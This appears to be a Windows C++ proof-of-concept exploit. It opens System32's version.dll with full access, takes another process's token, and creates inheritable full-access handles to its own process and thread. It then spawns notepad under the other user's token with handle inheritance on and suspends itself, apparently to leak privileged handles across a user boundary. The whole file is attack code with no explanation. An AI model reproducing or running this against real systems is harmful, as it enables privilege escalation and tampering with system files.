#include <iostream>
#include <Windows.h>
#include <corecrt_io.h>

int main(int argc, char** argv)
{
	if (argc <= 1) {
		printf("[-] Please give me a target PID\n");
		return -1;
	}

	HANDLE hUserToken, hUserProcess;
	HANDLE hProcess, hThread, hFile;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	hFile = CreateFile(L"C:\\Windows\\System32\\version.dll", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open file: %d\n", GetLastError());
		return -1;
	}

	std::cout << "[+] File handle: " << std::hex << hFile << "\n";

	hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
	if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &hUserToken)) {
		printf("[-] Failed to open user process: %d\n", GetLastError());
		CloseHandle(hUserProcess);
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
	if (hProcess == NULL)
	{
		std::cerr << "[-] Failed to open process\n";
		return 1;
	}
	std::cout << "[+] Process handle: " << std::hex << hProcess << "\n";

	hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, GetCurrentThreadId());
	if (hThread == NULL) {
		std::cerr << "[-] Failed to open thread\n";
		return 1;
	}

	std::cout << "[+] Thread handle: " << std::hex << hThread << "\n";

	char cmd[] = "C:\\Windows\\System32\\notepad.exe";
	if (!CreateProcessAsUserA(hUserToken, NULL,
		cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		std::cerr << "[-] Failed to create process as user: " << std::hex << GetLastError() << "\n";
		return 1;
	}
	SuspendThread(hThread);
	return 0;
}